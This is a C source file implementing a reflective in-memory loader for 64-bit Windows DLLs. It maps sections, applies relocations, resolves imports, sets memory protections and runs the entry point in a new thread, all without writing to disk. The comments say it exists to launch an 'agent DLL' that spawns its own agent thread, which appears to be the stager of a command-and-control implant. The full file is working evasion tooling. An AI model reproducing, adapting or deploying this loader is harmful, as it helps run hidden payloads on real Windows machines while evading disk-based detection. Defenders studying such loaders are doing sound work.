/*
 * pe_loader.c — In-memory PE loader (Reflective DLL Loading)
 *
 * Loads a Windows PE DLL from a raw byte buffer into executable memory
 * without touching disk.  Handles:
 *  - Section mapping
 *  - Base relocations (.reloc)
 *  - Import table resolution (LoadLibraryA / GetProcAddress)
 *  - Per-section memory protection (RX / R / RW)
 *  - DllMain invocation via CreateThread
 *
 * Supports 64-bit PE only (the agent_dll is x86_64).
 *
 * NOTE ON TLS:
 * The agent DLL's AddressOfEntryPoint is _DllMainCRTStartup (not DllMain
 * directly).  _DllMainCRTStartup calls _initptd which allocates and sets
 * up the CRT PE-TLS slot for the calling thread (dll_thread here).
 * For *other* threads that run DLL code (agent_thread), the DLL itself must
 * call its entry-point with DLL_THREAD_ATTACH at thread start — this is done
 * inside agent_thread in lib.rs.
 */

#include "pe_loader.h"
#include <windows.h>
#include <string.h>
#include <stdio.h>

/* ---- Macros ---- */
#define RELOC_TYPE_ABSOLUTE 0
#define RELOC_TYPE_DIR64    10

/* Shorthand to RVA → VA */
#define RVA2VA(base, rva)  ((LPVOID)((BYTE*)(base) + (rva)))

/* ---- Internal helpers ---- */

static BOOL apply_relocations(BYTE* image, IMAGE_NT_HEADERS64* nt, ULONGLONG delta) {
    if (delta == 0) return TRUE;  /* Loaded at preferred base — no relocs needed */

    IMAGE_DATA_DIRECTORY* reloc_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_dir->VirtualAddress == 0 || reloc_dir->Size == 0) {
        /* No relocation table — DLL must have been loaded at preferred base */
        return (delta == 0);
    }

    BYTE* reloc_ptr = image + reloc_dir->VirtualAddress;
    BYTE* reloc_end = reloc_ptr + reloc_dir->Size;

    while (reloc_ptr < reloc_end) {
        IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc_ptr;
        if (block->VirtualAddress == 0 || block->SizeOfBlock < sizeof(*block))
            break;

        DWORD entry_count = (block->SizeOfBlock - sizeof(*block)) / sizeof(WORD);
        WORD* entries     = (WORD*)(reloc_ptr + sizeof(*block));

        for (DWORD i = 0; i < entry_count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            if (type == RELOC_TYPE_ABSOLUTE) continue;
            if (type == RELOC_TYPE_DIR64) {
                ULONGLONG* patch = (ULONGLONG*)(image + block->VirtualAddress + offset);
                *patch += delta;
            }
        }
        reloc_ptr += block->SizeOfBlock;
    }
    return TRUE;
}

static BOOL resolve_imports(BYTE* image, IMAGE_NT_HEADERS64* nt) {
    IMAGE_DATA_DIRECTORY* import_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->VirtualAddress == 0) return TRUE;  /* No imports */

    IMAGE_IMPORT_DESCRIPTOR* desc =
        (IMAGE_IMPORT_DESCRIPTOR*)(image + import_dir->VirtualAddress);

    for (; desc->Name != 0; desc++) {
        const char* dll_name = (const char*)(image + desc->Name);
        HMODULE hMod = LoadLibraryA(dll_name);
        if (!hMod) {
            /* Non-fatal for optional deps; continue */
            continue;
        }

        IMAGE_THUNK_DATA64* iat =
            (IMAGE_THUNK_DATA64*)(image + desc->FirstThunk);
        IMAGE_THUNK_DATA64* int_tbl =
            (IMAGE_THUNK_DATA64*)(image + (desc->OriginalFirstThunk
                                           ? desc->OriginalFirstThunk
                                           : desc->FirstThunk));

        for (; int_tbl->u1.AddressOfData != 0; int_tbl++, iat++) {
            FARPROC fn = NULL;

            if (IMAGE_SNAP_BY_ORDINAL64(int_tbl->u1.Ordinal)) {
                /* Import by ordinal */
                fn = GetProcAddress(hMod,
                    (LPCSTR)(IMAGE_ORDINAL64(int_tbl->u1.Ordinal)));
            } else {
                /* Import by name */
                IMAGE_IMPORT_BY_NAME* by_name =
                    (IMAGE_IMPORT_BY_NAME*)(image + int_tbl->u1.AddressOfData);
                fn = GetProcAddress(hMod, by_name->Name);
            }

            if (!fn) {
                /* Import not found — might be acceptable for optional functions */
                IMAGE_IMPORT_BY_NAME* by_name =
                    (IMAGE_IMPORT_BY_NAME*)(image + int_tbl->u1.AddressOfData);
                (void)by_name;  /* suppress unused warning */
                iat->u1.Function = 0;
                continue;
            }
            iat->u1.Function = (ULONGLONG)fn;
        }
    }
    return TRUE;
}

static DWORD section_protect(DWORD characteristics) {
    BOOL exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL write = (characteristics & IMAGE_SCN_MEM_WRITE)   != 0;
    BOOL read  = (characteristics & IMAGE_SCN_MEM_READ)    != 0;

    if (exec && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)  return PAGE_EXECUTE_READ;
    if (exec)          return PAGE_EXECUTE;
    if (write)         return PAGE_READWRITE;
    return PAGE_READONLY;
}

/* DllMain thread wrapper — called via CreateThread */
typedef struct {
    BYTE*   base;
    DWORD   ep_rva;
} DllThreadParam;

static DWORD WINAPI dll_thread(LPVOID param) {
    DllThreadParam* p = (DllThreadParam*)param;
    typedef BOOL (WINAPI *DllMain_t)(HMODULE, DWORD, LPVOID);
    DllMain_t dllmain = (DllMain_t)(p->base + p->ep_rva);
    /* Call entry-point (_DllMainCRTStartup) with DLL_PROCESS_ATTACH.
     * This runs CRT init (_initptd), sets up PE TLS for THIS thread,
     * then calls user DllMain which spawns agent_thread.              */
    dllmain((HMODULE)p->base, DLL_PROCESS_ATTACH, NULL);
    return 0;
}

/*
 * reflective_load
 *
 * Given raw DLL bytes in memory, loads the PE into a new virtual allocation
 * and calls DllMain in a new thread.
 *
 * Returns TRUE on success.
 */
BOOL reflective_load(BYTE* raw, DWORD raw_size) {
    if (!raw || raw_size < sizeof(IMAGE_DOS_HEADER)) return FALSE;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)                       return FALSE;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)        return FALSE;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return FALSE;

    DWORD image_size = nt->OptionalHeader.SizeOfImage;

    /* 1. Allocate executable memory for the mapped DLL */
    BYTE* image = (BYTE*)VirtualAlloc(
        (LPVOID)nt->OptionalHeader.ImageBase,
        image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!image) {
        image = (BYTE*)VirtualAlloc(
            NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        );
    }
    if (!image) return FALSE;

    /* 2. Copy PE headers */
    memcpy(image, raw, nt->OptionalHeader.SizeOfHeaders);

    /* 3. Copy sections */
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData == 0) continue;
        BYTE* src  = raw   + sections[i].PointerToRawData;
        BYTE* dst  = image + sections[i].VirtualAddress;
        DWORD size = sections[i].SizeOfRawData;
        if (sections[i].PointerToRawData + size > raw_size) continue;
        memcpy(dst, src, size);
    }

    /* 4. Apply base relocations */
    ULONGLONG delta = (ULONGLONG)image - nt->OptionalHeader.ImageBase;
    if (!apply_relocations(image, nt, delta)) {
        VirtualFree(image, 0, MEM_RELEASE);
        return FALSE;
    }

    /* 5. Resolve imports */
    if (!resolve_imports(image, nt)) {
        VirtualFree(image, 0, MEM_RELEASE);
        return FALSE;
    }

    /* 6. Per-section memory protections */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].VirtualAddress == 0) continue;
        BYTE*  sec_va   = image + sections[i].VirtualAddress;
        SIZE_T sec_size = sections[i].Misc.VirtualSize
                          ? sections[i].Misc.VirtualSize
                          : sections[i].SizeOfRawData;
        DWORD  protect  = section_protect(sections[i].Characteristics);
        DWORD  old_prot = 0;
        VirtualProtect(sec_va, sec_size, protect, &old_prot);
    }

    /* 7. Execute DllMain via CreateThread */
    static DllThreadParam param;
    param.base   = image;
    param.ep_rva = nt->OptionalHeader.AddressOfEntryPoint;

    HANDLE hThread = CreateThread(NULL, 0, dll_thread, &param, 0, NULL);
    if (!hThread) {
        VirtualFree(image, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Agent runs in its own thread. Wait briefly for DllMain init. */
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    return TRUE;
}
